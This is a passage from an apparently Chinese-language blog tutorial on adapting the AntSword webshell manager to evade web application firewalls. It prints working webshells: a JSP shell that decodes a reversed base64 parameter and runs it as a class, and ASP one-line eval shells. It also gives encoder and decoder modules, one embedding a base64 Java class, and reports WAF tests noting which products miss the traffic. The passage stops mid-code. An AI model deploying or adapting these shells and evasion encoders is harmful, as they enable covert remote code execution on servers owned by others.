class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (byte[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="built_in">String</span>.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="built_in">Object</span> decoder = clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (byte[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="built_in">String</span>.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="built_in">String</span> cls = request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">String</span> reversedCls = <span class="keyword">new</span> StringBuilder(cls).reverse().toString();</span><br><span class="line">        <span class="built_in">String</span> decodedCls = <span class="keyword">new</span> <span class="built_in">String</span>(base64Decode(reversedCls), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> U(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(decodedCls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">jspç¼–ç å™¨</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * jsp::base64ç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/04 21:37:02</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="comment">// shell åœ¨æ¥æ”¶åˆ° payload åï¼Œå…ˆå¤„ç† pwd å‚æ•°ä¸‹çš„å†…å®¹ï¼Œ</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ é™¤ _ åŸæœ‰çš„payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// è¿”å›ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jspè§£ç å™¨</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JSP::reverse è§£ç å™¨</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"> &#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">module</span>.exports = &#123;</span><br><span class="line">   <span class="attr">asoutput</span>: <span class="function">(<span class="params">ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * ext = &#123;</span></span><br><span class="line"><span class="comment">      *   opts: ç±»å‹ä¸º Object, Shell é…ç½®</span></span><br><span class="line"><span class="comment">      * &#125;</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     <span class="keyword">return</span> <span class="string">`yv66vgAAADIAeAoADgA3CgAkADgJACQAOQgAOgoAOwA8CAA9CAA+CgAUAD8IAEAKAAwAQQgAQgcAQwoADABEBwBFCgBGAEcKAA4ASAgASQcASgoAFABLBwBMCABNCgAMAE4KAE8AUAgAUQcAUgcAUwoAGgA3CABUCgAaAFUKABoAVgoAGgBXCgAaAFgIAFkKABQAWggAWwcAXAEAA3JlcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAxCYXNlNjRFbmNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHAEwHAEMHAEUHAFwHAFIBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAE0Fzb3V0cHV0QmFzZTY0LmphdmEMACcAXQwAKwAsDAAlACYBAAxqYXZhLnZlcnNpb24HAF4MAF8ALAEAAAEAAzEuOQwAYABhAQAQamF2YS51dGlsLkJhc2U2NAwAYgBjAQAKZ2V0RW5jb2RlcgEAD2phdmEvbGFuZy9DbGFzcwwAZABlAQAQamF2YS9sYW5nL09iamVjdAcAZgwAZwBoDABpAGoBAA5lbmNvZGVUb1N0cmluZwEAAltCDABrAGwBABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwAbQBuBwBvDABwAHEBAAZlbmNvZGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAx7Im1lc3NhZ2UiOiIMAHIAcwwAJwAoDAB0AHUMADMANAEAClxyXG58XHJ8XG4MAHYAdwEAAiJ9AQASc3JjL0Fzb3V0cHV0QmFzZTY0AQADKClWAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAJY29tcGFyZVRvAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAWZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAdyZXZlcnNlAQAbKClMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAKcmVwbGFjZUFsbAEAOChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7ACEAJAAOAAAAAQAAACUAJgAAAAMAAQAnACgAAQApAAAALgADAAIAAAAOKrcAASoqK7YAArUAA7EAAAABACoAAAAOAAMAAAAGAAQABwANAAgAAQArACwAAQApAAABGQAGAAYAAACgEgS4AAVNEgZOLBIHtgAImwBLEgm4AAo6BBkEEgsDvQAMtgANGQQDvQAOtgAPOgUZBbYAEBIRBL0ADFkDEwASU7YADRkFBL0ADlkDK7YAE1O2AA/AABROpwBEEhW4AAo6BBkEA70ADLYAFgO9AA62ABc6BRkFtgAQEhgEvQAMWQMTABJTtgANGQUEvQAOWQMrtgATU7YAD8AAFE4tsE4rsAABAAYAnACdABkAAgAqAAAAMgAMAAAACwAGAA4ACQARABIAEgAZABMALwAUAFoAFgBhABcAcwAYAJsAGwCdABwAngAdAC0AAAAnAAP9AFoHAC4HAC79AEAHAC8HADD/AAEAAwcAMQcALgcALgABBwAyAAEAMwA0AAEAKQAAAEgABAABAAAAMLsAGlm3ABsSHLYAHbsAGlkqtAADtwAetgAftgAgEiESBrYAIrYAHRIjtgAdtgAgsAAAAAEAKgAAAAYAAQAAACIAAQA1AAAAAgA2`</span>;</span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="attr">decode_buff</span>: <span class="function">(<span class="params">buff</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> res = Buffer.from(buff.toString().replace(<span class="regexp">/&#123;&quot;message&quot;:/g</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="regexp">/&quot;&#125;/g</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="3-wafæµ‹è¯•"><a href="#3-wafæµ‹è¯•" class="headerlink" title="3.wafæµ‹è¯•"></a>3.wafæµ‹è¯•</h5><h6 id="3-1waf-é›·æ± "><a href="#3-1waf-é›·æ± " class="headerlink" title="3.1waf é›·æ± "></a>3.1waf é›·æ± </h6><p>è¿™é‡Œæˆ‘ä»¬ä¸å»æ¢ç©¶è¿™webshellèƒ½ä¸èƒ½è¿‡wafï¼Œä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºè¿™ç§webshellæ—©å°±è¢«æ ‡è®°äº†ï¼Œæƒ³è¦webshellè¿‡wafï¼Œè‚¯å®šéœ€è¦æ”¹ä¸€æ”¹ã€‚<br>è€Œæ˜¯æµé‡å±‚é¢èƒ½ä¸èƒ½è¿‡ã€‚<br>phpå·²ç»è¯´åˆ°äº†ï¼Œé›·æ± åªæ‹¦æˆªè¯·æ±‚åŒ…ï¼Œä¸æ£€æµ‹å“åº”åŒ…ã€‚<br>å…ˆç”¨åŸç‰ˆçš„æœ¨é©¬è¯•ä¸€ä¸‹ï¼Œ</p><p><img src="/images/antsword-bypasswaf/image-20240307164817676.png" alt="image-20240307164817676"></p><p>ä¸æ‹¦æˆªï¼Œé‚£ä¹ˆä¸‹é¢çš„å°±ä¸ç”¨å†è¯•äº†ï¼Œè‚¯å®šä¹Ÿä¸æ‹¦æˆªã€‚</p><p><img src="/images/antsword-bypasswaf/image-20240307165111635.png" alt="image-20240307165111635"></p><h6 id="dç›¾"><a href="#dç›¾" class="headerlink" title="dç›¾"></a>dç›¾</h6><p>dç›¾æ˜¯ä¸ç®¡çš„ï¼Œè¿™é‡Œç¬”è€…æ²¡æœ‰æ­å»ºå¥½ç¯å¢ƒ<br>dç›¾é»˜è®¤æ˜¯å’Œiisä¸€èµ·ä½¿ç”¨çš„ï¼Œè€Œiisæ˜¯aspç¯å¢ƒï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸æµ‹è¯•äº†ï¼Œç­‰aspçš„æ—¶å€™åœ¨è¿›è¡Œæµ‹è¯•ã€‚<br>æµ…æµ…æŸ¥æ€ä¸€ä¸‹ï¼Œä¸ç”¨è¯´<br><img src="/images/antsword-bypasswaf/image-20240307170241885.png" alt="image-20240307170241885"></p><h6 id="å®‰å…¨ç‹—"><a href="#å®‰å…¨ç‹—" class="headerlink" title="å®‰å…¨ç‹—"></a>å®‰å…¨ç‹—</h6><p>å®‰å…¨ç‹—æœ‰iiså’Œapacheç‰ˆï¼Œæ²¡æœ‰tomcatç‰ˆã€‚ä¹Ÿä¸æµ‹è¯•äº†ï¼Œ<br>åœ¨æµ‹è¯•æµé‡çš„æ—¶å€™ç¡®å®æ˜¯ä¸€ç›´æŠ¥webshellï¼Œæ­£å¸¸ã€‚</p><h4 id="antsword-aspæ”¹é€ "><a href="#antsword-aspæ”¹é€ " class="headerlink" title="antsword-aspæ”¹é€ "></a>antsword-aspæ”¹é€ </h4><h5 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h5><p>aspæœ¨é©¬,æœ¨é©¬ä¸ºa</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;% eval(request(&quot;a&quot;))%&gt;</span><br><span class="line">----------------------------</span><br><span class="line">&lt;%</span><br><span class="line">Class LandGrey</span><br><span class="line">  Private Sub class_terminate</span><br><span class="line">    eval    (request(&quot;a&quot;))</span><br><span class="line">  End Sub</span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">Set X = New LandGrey</span><br><span class="line">Set X = Nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æ“ä½œä¸€ä¸‹ï¼Œå…ˆçœ‹ä¸€ä¸‹ï¼Œå¦‚æœbase64è¦æ€ä¹ˆæ“ä½œ<br>æ ¹æ®ä¸Šé¢çš„ç»éªŒï¼Œè¦åœ¨æœ¨é©¬é‡Œè¿›è¡Œbase64è§£ç <br>æˆ‘æ‰¾äº†è®¸å¤šç½‘ä¸Šçš„æ–¹æ³•ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°å†…ç½®çš„base64çš„æ–¹æ³•ã€‚<br>æ‰€ä»¥éœ€è¦è‡ªå·±å†™ä¸€ä¸ªäº†ã€‚æˆ–è€…ç½‘ç«™æ‰¾ä¸€ä¸ª<br><a href="https://taotaoit.com/article/details/360.html">https://taotaoit.com/article/details/360.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">OPTION EXPLICIT</span><br><span class="line">const BASE_64_MAP_INIT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line">dim newline</span><br><span class="line">dim Base64EncMap(63)</span><br><span class="line">dim Base64DecMap(127)</span><br><span class="line">&#x27;åˆå§‹åŒ–å‡½æ•°</span><br><span class="line">PUBLIC SUB initCodecs()</span><br><span class="line">    &#x27; åˆå§‹åŒ–å˜é‡</span><br><span class="line">    newline = &quot;&lt;P&gt;&quot; &amp; chr(13) &amp; chr(10)</span><br><span class="line">    dim max, idx</span><br><span class="line">    max = len(BASE_64_MAP_INIT)</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64EncMap(idx) = mid(BASE_64_MAP_INIT, idx + 1, 1)</span><br><span class="line">    next</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64DecMap(ASC(Base64EncMap(idx))) = idx</span><br><span class="line">    next</span><br><span class="line">END SUB</span><br><span class="line">&#x27;Base64åŠ å¯†å‡½æ•°</span><br><span class="line">PUBLIC FUNCTION base64Encode(plain)</span><br><span class="line">    if len(plain) = 0 then</span><br><span class="line">        base64Encode = &quot;&quot;</span><br><span class="line">        exit function</span><br><span class="line">    end if</span><br><span class="line">    dim ret, ndx, by3, first, second, third</span><br><span class="line">    by3 = (len(plain) \ 3) * 3</span><br><span class="line">    ndx = 1</span><br><span class="line">    do while ndx &lt;= by3</span><br><span class="line">        first = asc(mid(plain, ndx+0, 1))</span><br><span class="line">        second = asc(mid(plain, ndx+1, 1))</span><br><span class="line">        third = asc(mid(plain, ndx+2, 1))</span><br><span class="line">        ret = ret &amp; Base64EncMap( (first \ 4) AND 63 )</span><br><span class="line">        ret = ret &amp; Base64EncMap( ((first * 16) AND 48) + ((second \ 16) AND 15 ) )</span><br><span class="line">        ret = ret &amp; Base64EncMap( ((second * 4) AND 60) + ((third \ 64) AND 3 ) )</span><br><span class="line">        ret = ret &amp; Base64EncMap( third AND 63)</span><br><span class="line">        ndx = ndx + 3</span><br><span class="line">    loop</span><br><span class="line">    if by3 &lt; len(plain) then</span><br><span class="line">        first = asc(mid(plain, ndx+0, 1))</span><br><span class="line">        ret = ret &amp; Base64EncMap( (first \ 4) AND 63 )</span><br><span class="line">        if (len(plain) MOD 3 ) = 2 then</span><br><span class="line">            second = asc(mid(plain, ndx+1, 1))</span><br><span class="line">            ret = ret &amp; Base64EncMap( ((first * 16) AND 48) + ((second \ 16) AND 15 ) )</span><br><span class="line">            ret = ret &amp; Base64EncMap( ((second * 4) AND 60) )</span><br><span class="line">        else</span><br><span class="line">            ret = ret &amp; Base64EncMap( (first * 16) AND 48)</span><br><span class="line">            ret = ret &#x27;&amp; &quot;=&quot;</span><br><span class="line">        end if</span><br><span class="line">        ret = ret &#x27;&amp; &quot;=&quot;</span><br><span class="line">    end if</span><br><span class="line">    base64Encode = ret</span><br><span class="line">END FUNCTION</span><br><span class="line">&#x27;Base64è§£å¯†å‡½æ•°</span><br><span class="line">PUBLIC FUNCTION base64Decode(scrambled)</span><br><span class="line">    if len(scrambled) = 0 then</span><br><span class="line">        base64Decode = &quot;&quot;</span><br><span class="line">        exit function</span><br><span class="line">    end if</span><br><span class="line">    dim realLen</span><br><span class="line">    realLen = len(scrambled)</span><br><span class="line">    do while mid(scrambled, realLen, 1) = &quot;=&quot;</span><br><span class="line">        realLen = realLen - 1</span><br><span class="line">    loop</span><br><span class="line">    dim ret, ndx, by4, first, second, third, fourth</span><br><span class="line">    ret = &quot;&quot;</span><br><span class="line">    by4 = (realLen \ 4) * 4</span><br><span class="line">    ndx = 1</span><br><span class="line">    do while ndx &lt;= by4</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        third = Base64DecMap(asc(mid(scrambled, ndx+2, 1)))</span><br><span class="line">        fourth = Base64DecMap(asc(mid(scrambled, ndx+3, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        ret = ret &amp; chr( ((third * 64) AND 255) + (fourth AND 63))</span><br><span class="line">        ndx = ndx + 4</span><br><span class="line">    loop</span><br><span class="line">    if ndx &lt; realLen then</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        if realLen MOD 4 = 3 then</span><br><span class="line">            third = Base64DecMap(asc(mid(scrambled,ndx+2,1)))</span><br><span class="line">            ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line">    base64Decode = ret</span><br><span class="line">END FUNCTION</span><br><span class="line"> </span><br><span class="line">&#x27; åˆå§‹åŒ–</span><br><span class="line">call initCodecs</span><br><span class="line">&#x27; æµ‹è¯•ä»£ç </span><br><span class="line">dim inp, encode</span><br><span class="line">inp = &quot;mars20100220&quot;</span><br><span class="line">encode = base64Encode(inp)</span><br><span class="line">&#x27;encode = &quot;bWFyczIwMTAwMjIw0&quot;</span><br><span class="line">response.write &quot;åŠ å¯†å‰ä¸º:&quot; &amp; inp &amp; newline</span><br><span class="line">response.write &quot;åŠ å¯†åä¸º:&quot; &amp; encode &amp; newline</span><br><span class="line">response.write &quot;è§£å¯†åä¸º:&quot; &amp; base64Decode(encode) &amp; newline</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/antsword-bypasswaf/image-20240402143044552.png" alt="image-20240402143044552"></p><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±éœ€è¦æ”¹ä¸€ä¸‹äº†ã€‚</p><h5 id="aspç¼–ç å™¨"><a href="#aspç¼–ç å™¨" class="headerlink" title="aspç¼–ç å™¨"></a>aspç¼–ç å™¨</h5><p>è€æ ·å­ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠ_æ‰€ä¼ é€’çš„å†…å®¹ç¼–ç æ—¢å¯ï¼Œå…¶ä¸­ä¼ é€’çš„åŠŸèƒ½å‚æ•°å…ˆä¸ç®¡</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * asp::base64ç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/04 21:37:02</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// è¿”å›ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬çš„webshellå°±éœ€è¦è¿›è¡Œè§£ç äº†ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">OPTION EXPLICIT</span><br><span class="line">const BASE_64_MAP_INIT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line">dim newline</span><br><span class="line">dim Base64EncMap(63)</span><br><span class="line">dim Base64DecMap(127)</span><br><span class="line">&#x27;åˆå§‹åŒ–å‡½æ•°</span><br><span class="line">PUBLIC SUB initCodecs()</span><br><span class="line">    &#x27; åˆå§‹åŒ–å˜é‡</span><br><span class="line">    newline = &quot;&lt;P&gt;&quot; &amp; chr(13) &amp; chr(10)</span><br><span class="line">    dim max, idx</span><br><span class="line">    max = len(BASE_64_MAP_INIT)</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64EncMap(idx) = mid(BASE_64_MAP_INIT, idx + 1, 1)</span><br><span class="line">    next</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64DecMap(ASC(Base64EncMap(idx))) = idx</span><br><span class="line">    next</span><br><span class="line">END SUB</span><br><span class="line">&#x27;Base64è§£å¯†å‡½æ•°</span><br><span class="line">PUBLIC FUNCTION base64Decode(scrambled)</span><br><span class="line">    if len(scrambled) = 0 then</span><br><span class="line">        base64Decode = &quot;&quot;</span><br><span class="line">        exit function</span><br><span class="line">    end if</span><br><span class="line">    dim realLen</span><br><span class="line">    realLen = len(scrambled)</span><br><span class="line">    do while mid(scrambled, realLen, 1) = &quot;=&quot;</span><br><span class="line">        realLen = realLen - 1</span><br><span class="line">    loop</span><br><span class="line">    dim ret, ndx, by4, first, second, third, fourth</span><br><span class="line">    ret = &quot;&quot;</span><br><span class="line">    by4 = (realLen \ 4) * 4</span><br><span class="line">    ndx = 1</span><br><span class="line">    do while ndx &lt;= by4</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        third = Base64DecMap(asc(mid(scrambled, ndx+2, 1)))</span><br><span class="line">        fourth = Base64DecMap(asc(mid(scrambled, ndx+3, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        ret = ret &amp; chr( ((third * 64) AND 255) + (fourth AND 63))</span><br><span class="line">        